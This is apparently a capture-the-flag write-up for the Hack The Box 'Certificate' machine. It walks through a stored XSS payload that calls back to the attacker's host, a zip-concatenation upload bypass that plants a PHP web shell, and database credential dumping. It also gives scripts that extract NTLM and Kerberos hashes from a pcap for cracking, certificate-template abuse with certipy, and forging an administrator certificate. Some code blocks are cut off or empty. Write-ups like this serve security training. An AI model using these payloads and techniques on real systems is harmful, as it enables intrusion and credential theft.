## Summary

## Enumeration

We start with nothing, but we try an nmap scan.

```

We can query for the domain sid via RPC but not much else,
```bash
rpclcient -U '' -N '//certificate.htb' -c 'lsaquery
```


The webserver is using the [`Eclipse`](https://preview.colorlib.com/#eclipse) theme from Colorlib
Looking at the base theme and what we have, the main difference is the login panel providing registration and well..logins. So my immediate suspicion goes there. The contact page submission has a different message after posting so that's also an avenue of exploration.


### Registration
We can register an account, but we can't view any profiles. The one thing to note is our username gets populated into the 'Welcome back' slogan. And we can surprisingly register with a username that contains script tags.
This is stored XXS
![stored_xxs](../assets/posts/htb-certificate/stored_xxs.png)

Some issues with registration:
- Username and email are apparently factors in uniqueness of an account.
- Usernames have seemingly length limitations for logins
- Quotes aren't allowed

Playing with the payload a bit, to figure out how what's allowed. Figuring out the discoveries above. 
I defaulted to
```html
<script src=http://$my_ip:8000/xxs.js>
```
Which provides me some call back
We have a potential chain here already viewing the clues.

Anything that renders our username will reflect this, teacher accounts apparently need approval, and we need to email them for approval.
So, my suspicion is we need to register a teacher with some stored xxs and when they come to check on it we should get a reply.

However, after attempting this nicely thought out plan to see if I ever get a call back from my server, led to some sadness.
So I went to explore more functionality of the website and I should have done this sooner, because I can upload files?

![upload](../assets/posts/htb-certificate/file_upload.png)

This seems more likely the way forward.


### Uploads
The site says it only accepts certain file extensions: PDF, docx, pptx, xlsx, and .zip
Depending on if they're interacted with and the versions they all could be potentially vulnerable, but let's just see if it's something easier with a simple php reverse shell first. My suspicion is no, given the newer PHP version and the use of HttpOnly cookies, you'd have to go out of your way to execute submitted assignments as php but...always try.

Uploading php content, even with the wrong extension leads to malicious content found. So it is likely running some type of content checking.
I tried XLS files but the header is also errored out for an invalid mimetype.
However, PDF, docx, ppt, and zip works and we get a visible link to our page.
![upload_success](../assets/posts/htb-certificate/pdf_upload_success.png)

The url is an md5sum, I was thinking it might be just the md5sum of our username, but that's not the case. It does change based on user, but not based on file, so IDOR doesn't seem likely.
I had played with a variety of different possibilities, trying to modify the content to see if an XXE injection was possible, but nothing would let me upload, and there was no guarantee that anyone is actually clicking anything.
So after some searching, there's apparently a method of [concatenating zip files](https://cybersecuritynews.com/hackers-employ-zip-file-concatenation/) that allows for extra malicious files to be tagged along, since content checkers typically only check the last `valid` zip entry, but unzippers are extra smart and detect another zip and unzip the whole archive.
So we craft a payload:

```bash
echo 'test' > z.pdf
echo '<?=`$_GET[0]`?>' > s.php
zip 1.zip z.pdf
zip 2.zip s.php
cat 1.zip 2.zip > 3.zip
```
You can then unzip this file to see the method at work,

Upload our 3.zip and we get a success:

![zip_success](../assets/posts/htb-certificate/successful_zip.png)

So we can copy that link, and replace it with our shell file, that was also in the zip.
```bash
curl -s http://certificate.htb/static/uploads/3160192f554f27d2f295db22ef5556d9/s.php?0=whoami
certificate\xamppuser 
```
And we're in.
We can then just get a reverse shell, with revshells after url encoding it and now we navigate


## Foothold...now what?

Looking at `upload.php` in the web directory, does indeed verify that xlsx was just a lie. It also was using winrar to extract the zips and checking if more than one archive was there.
```php
<?
// snip
        // Validate file type
        $allowedMimeTypes = ['application/zip', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/pdf', 'application/vnd.openxmlformats-officedocument.presentationml.presentation'];
        $allowedExtensions = ['zip', 'docx', 'pdf', 'pptx'];

// snip

        if ($fileExtension === 'zip') {
                // Extract ZIP file contents
                $zip = new ZipArchive();
                if ($zip->open($fileTmpPath) === true) {
                        if ($zip->count() > 1) {
                                $message = "Please Include a single assignment file in the archive";
                                exit;
                        } else {
                                $innerFileName = $zip->getNameIndex(0);
                                if (!in_array(pathinfo($innerFileName, PATHINFO_EXTENSION), $allowedExtensions)) {
                                        http_response_code(400);
                                        echo "<h1>400 Bad Request</h1>";
                                        echo "<p>The request you sent contains bad or malicious content(Invalid Extension).</p>";
                                        exit;
                                }
                        }
                        echo exec('"C:\\Program Files\\WinRAR\\WinRAR.exe" x -y ' . $fileTmpPath . " " . $destinationDir);
                        $zip->close();
                        // echo "ZIP file successfully extracted to: $destinationDir";
                        $message = "File uploaded successfully!. You can check your uploaded assignment file(in case you want to re-upload it or do some changes) <a href='static/uploads/$md5Directory/$innerFileName'>HERE</a>";
                } else {
                        echo "Failed to open the ZIP file.";
                        exit;
                }
?>
```

And in side this web folder there is a db.php. This houses some mysql local credentials.

```php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

Searching around in this xampp directory, leads us to the mysql folder, it has a binary with which we can dump the database in a readable format (as opposed to using `type users.ibd`)
```powershell
C:\xampp\mysql\bin\mysqldump.exe -u certificate_webapp_user -p'$PASS' certificate_webapp_db
```
This reveals some users with their hashes: I reformatted it for readability.
```text
username,password
Lorra.AAA,$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG

sara.b,$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
```


The next obvious thing is to try and crack these hashes, even though they're bcrypt which is pretty computationally complex, what else do we have? Oh we also try a kerbrute to see which usernames might be valid elsewhere.

```bash
kerbrute userenum -d certificate.htb --dc dc01.certificate.htb users.txt
```
```

## Lateral Movement
We're in. Next I ran rusthound to gather some active-directory data. It does reveal that we have winrm and *remote desktop* access, so we can probably grab a flag.

After running rusthound, I have a a python script that quickly tells me all the groups with the users underneath so I have a decent idea of what we should look for, for reference. Bloodhound requires a tad bit more clicking to get that information.

```bash
./bh_uniques.py -z 20250801110257_certificate-htb_rusthound-ce.zip

So we have Sara.b who's a member of help desk, and other possibly interesting users, could be the `Domain CRA Managers`, `Finance`, `Marketing`, or `Domain Storage Managers` 

Logging in via winrm with the sara.b user already reveals something interesting.

```


a pcap file, and a description, which tells us there's some bugginess going with the WS-01 computer with smb authentication. So let's investigate this pcap file. 
Downloading it checking what kind of packets we have.
```bash
tshark -r WS-01_PktMon.pcap -T fields -e tcp.dstport -e udp.dstport | sort -nu | head

        53
88
135
        389
445
49667
49673
49692
49693
```

We have some DNS, some kerberos (oddly), some RPC, LDAP, and SMB.

The issue was the SMB initially so we can actually grab all the ntlm hashes and see if we can crack any, since credentials were given. This script I devised outputs them in hashcat format, since there's quite a bit, you never know if they mistyped and had *close* credentials that could be cracked.
```bash
#!/usr/bin/env bash

pcap=$1


data_dump=$(tshark -r $pcap -Y 'ntlmssp' -T fields -e ntlmssp.auth.username -e ntlmssp.ntlmserverchallenge  -e ntlmssp.ntlmv2_response.nb_domain_name -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.ntlmv2_response | sed '/^[[:space:]]*$/d')

mapfile -t lines <<< "$data_dump"

for (( i=0; i<${#lines[@]}-1; i+=2)); do
    challenge=$(echo -n "${lines[i]}"  | tr -d '[:space:]')
    IFS=$'\t' read -r user domain ntproof full_blob <<< "${lines[i+1]}"
    if [[ -n "$user" && -n "$domain" && -n "$challenge" && -n "$ntproof" && -n "$full_blob" ]]; then
    blob="${full_blob#$ntproof}"
    echo "$user::$domain:$challenge:$ntproof:${blob}"
    fi
done
```


```bash
./dump_ntlm_hashes.sh WS-01_PktMon.pcap > smb_hashes
hashcat smb_hashes /seclists/rockyou.txt
```

Provides us unfortunately with nothing. If you inspect the hashes, that would have been the admin hash, which would have been great.

So unlikely for credential access there, but the other aspect we saw was kerberos.

```bash
tshark -r WS-01_PktMon -Y 'kerberos'
```

Then we can do something similar targeting the AS-REQ since the user's hash will get passed as authentication. A modified script for the kerberos ones. Inspecting the user here is a different one...we have lion.sk who was a member of the `Domain CRA Managers` which may be useful

```bash
#!/usr/bin/env bash

pcap=$1

# Capture the Kerberos AS-REP messages
data_dump=$(tshark -r "$pcap" -Y 'kerberos.msg_type == 10' \
  -T fields -e kerberos.CNameString -e kerberos.realm -e kerberos.cipher)

# Process each line
while IFS=$'\t' read -r user domain hash; do
    [[ -z $user || -z $domain || -z $hash ]] && continue
    echo "\$krb5pa\$18\$$user\$$domain\$$hash"
done <<< "$data_dump"
```

```bash
./dump_krb5ASREQ_pcap.sh WS-01_PktMon.pcap > lion_sk.hash
hashcat lion_sk.hash /seclists/rockyou.txt

```
```text
$krb5pa$18$Lion.SK$CERTIFICATE$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QA<redacted>
```

So we have it. These credentials do indeed work, so what can lion.sk do?
![domain_cra](../assets/posts/htb-certificate/bh_domain_cra.png)
They're a part of the `Domain CRA Managers` which is reponsible for issuing and revoking certificates. And this domain doesn't have the typical `User` template, it has `SignedUser` which requires a signed certificate to issue it. This member allows us to issue to request a certificate and then issue new user certificates on behalf of other users. This likely won't work for every user, but we'll have to see.

We can see the the Delegated-CRA certificate is an enrollment agent certificate, with which we can enroll on behalf of other users.
The [certipy wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template) details the attack flow.
Request the delegated
```bash
certipy req -u lion.sk -p $pass -dc-ip 10.10.11.71 -target certificate.htb -ca certificate-ltd-ca -template delegated-cra 
```

Request on behalf
```bash
certipy req -u lion.sk -p $pass -dc-ip 10.10.11.71 -target certificate.htb -ca certificate-ltd-ca -template SignedUser  -pfx $lionsk_cert -on-behalf-of 'Administrator'

[*] Request ID is 24
[-] Got error while requesting certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.

```

And that delightfully fails due to the email name being unavailable. So what other user might be valuable to try? The only one that is a part of a group that we don't have real access too that seems exploitable is `Ryan.K` who in the `Domain Storage Managers` which, on its surface sounds great and isn't a default group.

```bash
certipy  req -u 'lion.sk' -p $pass -dc-ip 10.10.11.71 -target certificate.htb -ca certificate-ltd-ca -template 'SignedUser' -pfx lion.sk.pfx -on-behalf-of ryan.k

We have a certificate for ryan, so let's auth, not forgetting the clock skew.

```

That works! So we can login with kerberos or the hash, I'll use the hash for simplicity. Then we can see what permissions this fella might have.

```powershell
whoami /priv
```

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled

```

`SeManageVolumePrivilege`
This is apparently an exploitable privilege, that I had never known about. A simple [exe](https://github.com/CsEnox/SeManageVolumeExploit) can be ran that actually grants full permissions for most of the drive and potentially shell acess. How it's hardcoded just goes through replacing Admin SIDS with the Users SID, which we can see in the icacls output.
However, there's something else that might be of interest since we're on the DC and there's no other pivot points here, there's going to be the root certificate on the machine. So if we run `certutil -store My` we would be querying the Cryptographic Service Provider or CSP for the private key, it obviously knows where the private keys are but unless we have read access we can't export them. But perhaps this the SeManageVolumeExploit will let us export the Root-CA and with that, we would be able to do whatever we want, since we could forge certificates, create templates, anything we want, it's a Golden Certificate.


```powershell

#

```

We can try to read some typical things that we would want, perhaps root.txt or the SAM or SYSTEM hives, but we can't, this could be due to the SID for these being different.
```powershell
icacls C:\Users\Administrator\Desktop\root.txt
C:\Users\Administrator\Desktop\root.txt CERTIFICATE\Administrator:(F)
                                        NT AUTHORITY\SYSTEM:(I)(F)
                                        BUILTIN\Users:(I)(F)
                                        CERTIFICATE\Administrator:(I)(F)

```

We do have full access, but there's apparently some extra restriction going on with our access to this. However, if we run:
```powershell
certutil -store My
```

```

```

We havea Siginature test passed. This means we can export the private key and do the attack we talked about earlier.

```powershell
certutil -exportPFX My 75b2f4bbf31f108945147b466131bdca ca.pfx
```

Download the .pfx and we can use certipy to forge our admin ticket.
```bash
certipy forge -ca-pfx ca.pfx -upn Administrator -dc-ip 10.10.11.71

faketime -f +8hr $HOME/.local/bin/certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.11.71 -domain certificate.htb
